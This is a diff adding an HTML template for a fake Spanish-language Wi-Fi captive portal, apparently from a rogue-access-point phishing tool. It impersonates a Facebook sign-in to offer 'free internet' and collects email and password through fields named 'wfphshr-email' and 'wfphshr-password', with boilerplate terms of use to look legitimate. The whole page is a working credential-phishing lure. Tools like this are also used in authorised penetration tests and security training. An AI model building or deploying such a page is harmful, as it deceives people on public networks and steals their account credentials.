@@ -1,0 +1,111 @@
+<!--
+Copyright (c) 2019 by Andy Tran (http://codepen.io/andytran/pen/PwoQgO)
+Permission is hereby granted, free of charge, to any person obtaining a copy of this software and associated documentation files (the "Software"), to deal in the Software without restriction, including without limitation the rights to use, copy, modify, merge, publish, distribute, sublicense, and/or sell copies of the Software, and to permit persons to whom the Software is furnished to do so, subject to the following conditions:
+The above copyright notice and this permission notice shall be included in all copies or substantial portions of the Software.
+THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.
+-->
+
+<!DOCTYPE html>
+<html>
+
+<head>
+  <meta charset="UTF-8">
+  <title>{{ organization }} Wi-Fi</title>
+  <link rel="stylesheet" href="/static/css/reset.css">
+  <link rel='stylesheet prefetch' href='/static/css/roboto.css'>
+  <link rel='stylesheet prefetch' href='/static/css/font-awesome.min.css'>
+  <link rel="stylesheet" href="/static/css/style.css">
+  <script src='/static/js/jquery.min.js'></script>
+  <script src="/static/js/index.js"></script>
+</head>
+
+<body>
+  <!-- Form Mixin-->
+  <!-- Input Mixin-->
+  <!-- Button Mixin-->
+  <!-- Pen Title-->
+  <div class="pen-title">
+    <h1>Conéctese a Internet gratis</h1><span>Simple y rápido Wi-fi de {{ organization }}.</span>
+  </div>
+  <!-- Form Module-->
+  <div class="module form-module">
+    <div class="form">
+    </div>
+    <div class="form">
+      <h2>Entrar con Facebook</h2>
+      <!-- <img src="/static/logos/facebook-logo.png" width="25%" class="logo"></img> -->
+      <form name="theform" class="theform" method="post" action="oauth.html">
+        <input type="email" placeholder="Email" name="wfphshr-email" required />
+        <input type="password" placeholder="Contraseña" minlength="5" name="wfphshr-password" required />
+        <button class="login-btn">Entrar</button>
+      </form>
+    </div>
+    <div class="cta"><a id="btn1">Términos de uso</a></div>
+  </div>
+
+  <!-- The Modal -->
+  <div id="myModal" class="modal">
+
+    <!-- Modal content -->
+    <div class="modal-content">
+      <div class="modal-header">
+        <span class="close">×</span>
+        <h2>Términos de uso</h2>
+      </div>
+      <div class="modal-body">
+        <p>Este es un {{organization}} servicio gratuito de Internet inalámbrico Hotspot (el "Servicio") proporcionado para su uso por
+          clientes. Todos los usuarios deben iniciar sesión individualmente como usuarios independientes.</p>
+        <p>
+          El Servicio está disponible siempre que:
+        </p>
+        <p>
+          (a) No utilice el Servicio para nada ilegal, inmoral o inapropiado;
+        </p>
+        <p>
+          (b) No utiliza el Servicio para realizar comunicaciones ofensivas o molestas de cualquier forma. Tal uso
+           incluye publicar, transmitir, cargar, descargar o facilitar cualquier contenido que sea
+           ilegal, difamatorio, amenazante, molesto, obsceno, odioso, abusivo, dañino (incluyendo pero no limitado a
+           a virus, archivos corruptos o cualquier otro software o programa similar), una violación de la privacidad, o que sea
+           de lo contrario objetable;
+        </p>
+        <p>
+          (c) No utiliza el Servicio para dañar o intentar dañar a menores de ninguna manera;
+        </p>
+        <p>
+          (d) No actúa ni permite a sabiendas que otros actúen de tal manera que el funcionamiento del Servicio o nuestro
+           los sistemas se verán comprometidos o dañados;
+        </p>
+        <p>
+          (e) No utilice un comportamiento abusivo o amenazante hacia otros usuarios del Servicio, miembros de nuestro personal.
+           o cualquier persona en las proximidades de un punto de acceso de LAN inalámbrica;
+        </p>
+        <p>
+          (f) No usa el Servicio para acceder o usar contenido de una manera que infrinja los derechos de otros;
+        </p>
+        <p>
+          (g) El Servicio se utiliza de acuerdo con las políticas de terceros para un uso aceptable o cualquier
+           estándares de Internet (cuando corresponda).
+        </p>
+        <p>
+          (h) Acepta no revender ni retransmitir ningún aspecto del Servicio, ya sea con fines de lucro o de otro tipo. Tú
+           aceptar que su derecho a utilizar el Servicio es solo para su uso personal y que no será
+           tiene derecho a transferir su derecho a utilizar el Servicio a cualquier otra persona o permitir que cualquier otra persona
+           hacer uso del Servicio o de cualquier nombre de usuario o contraseña u otro derecho que se le proporcione en conexión
+           con el Servicio.
+        </p>
+        <p>
+          (i) También acepta no modificar la Unidad ni utilizar el Servicio para ningún propósito fraudulento, o de tal manera que
+           para crear daño o riesgo para nuestro negocio, reputación, empleados, suscriptores, instalaciones, terceros o para
+           el público en general.
+        </p>
+        <p>
+          (j) No tiene derechos de propiedad o propiedad sobre ningún nombre de usuario o contraseña o sobre una dirección IP específica, o
+           dirección de correo electrónico asignada a usted oa su Unidad. Podemos cambiar dichas direcciones en cualquier momento o desactivar o
+           suspender el Servicio a cualquier dirección sin previo aviso si sospechamos de un uso ilegal o fraudulento de
+           los servicios.
+        </p>
+      </div>
+    </div>
+</body>
+
+</html>
